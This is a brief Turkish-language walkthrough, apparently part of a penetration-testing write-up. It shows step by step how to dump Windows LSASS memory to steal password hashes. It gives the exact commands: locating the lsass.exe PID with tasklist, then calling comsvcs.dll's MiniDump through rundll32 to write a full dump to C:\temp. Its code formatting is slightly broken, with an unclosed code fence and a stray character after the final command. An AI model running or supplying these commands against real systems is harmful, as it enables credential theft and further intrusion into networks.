İlk olarak cmd.exe'yi Administrator (Yönetici) yetkileriyle açıyorum. Windows'un şifre özetlerini (hash) tutan lsass.exe sürecinin PID (Process ID) numarasını bulmak için tasklist aracını kullanıyorum:
```text
tasklist | findstr lsass.exe

Çıktıda yan tarafta yazan sayı (örn: 648) PID değeri oluyor. Daha sonra aşağıdaki komutu çalıştırarak comsvcs.dll içerisindeki MiniDump fonksiyonunu tetikliyorum. Bu komut, LSASS sürecinin tam bir bellek dökümünü diske yazar.

```text
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 648 C:\temp\lsass.dmp fullğ
